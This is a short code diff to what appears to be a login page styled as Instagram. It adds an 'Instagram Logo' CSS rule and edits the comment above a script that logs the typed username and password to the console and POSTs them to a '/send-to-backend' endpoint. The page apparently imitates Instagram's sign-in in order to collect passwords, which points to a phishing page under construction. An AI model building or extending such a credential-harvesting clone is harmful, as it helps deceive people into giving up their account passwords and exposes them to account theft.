@@ -34,6 +34,12 @@
             margin-bottom: 10px;
         }
 
+        /* Instagram Logo */
+        .logo {
+            width: 175px;
+            margin: 20px auto;
+        }
+
         /* Input Fields */
         input[type="text"], input[type="password"] {
             width: 100%;
@@ -174,8 +180,7 @@
             console.log('Username:', username);
             console.log('Password:', password);
 
-            // You can now send this data to a backend or API
-            // Example: Send to a backend endpoint using fetch()
+            // Send the data to your backend or API
             fetch('/send-to-backend', {
                 method: 'POST',
                 headers: {
